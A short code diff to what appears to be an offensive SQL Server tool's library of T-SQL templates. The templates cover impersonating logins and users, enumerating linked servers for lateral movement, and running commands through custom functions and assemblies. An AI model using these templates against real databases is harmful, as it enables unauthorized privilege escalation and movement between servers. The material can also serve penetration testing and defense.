@@ -3,9 +3,8 @@ CAN_IMPERSONATE_AS_SERVER_PRINCIPAL = "SELECT b.name as username, a.permission_n
 CAN_IMPERSONATE_AS_DATABASE_PRINCIPAL = "SELECT b.name as username, a.permission_name as permission_name FROM sys.database_permissions a INNER JOIN sys.database_principals b ON a.grantor_principal_id = b.principal_id;"
 GET_USER_SERVER_ROLES = "SELECT p.name AS 'group' FROM sys.server_principals p JOIN sys.server_role_members m ON p.principal_id = m.role_principal_id WHERE m.member_principal_id = SUSER_ID();"
 GET_USER_DATABASE_ROLES = "SELECT p.name AS 'group' FROM sys.database_principals p JOIN sys.database_role_members m ON p.principal_id = m.role_principal_id WHERE m.member_principal_id = SUSER_ID();"
-IMPERSONATE_AS_SERVER_PRINCIPAL = "EXECUTE AS LOGIN = '{username}';"
-IMPERSONATE_AS_DATABASE_PRINCIPAL = "EXECUTE AS USER = '{username}';"
-REVERT_IMPERSONATION = "REVERT;"
+IMPERSONATE_AS_SERVER_PRINCIPAL = "EXECUTE AS LOGIN = '{username}'; EXEC('[QUERY]'); REVERT"
+IMPERSONATE_AS_DATABASE_PRINCIPAL = "EXECUTE AS USER = '{username}'; EXEC('[QUERY]'); REVERT"
 
 # Lateral movement queries
 GET_LINKABLE_SERVERS = "SELECT name, provider, is_remote_login_enabled, is_rpc_out_enabled FROM sys.servers WHERE is_linked = 1;"
@@ -43,8 +42,3 @@ DROP_ASSEMBLY = "DROP ASSEMBLY {asm_name};"
 DROP_FUNCTION = "DROP FUNCTION {function_name};"
 FUNCTION_EXECUTION = "SELECT dbo.{function_name}({command});"
 LDAP_QUERY = "SELECT * FROM 'LDAP://localhost:{port}' "
-
-
-# For impersonation
-EXEC_PREFIX = "EXEC('"
-EXEC_SUFFIX = "');"
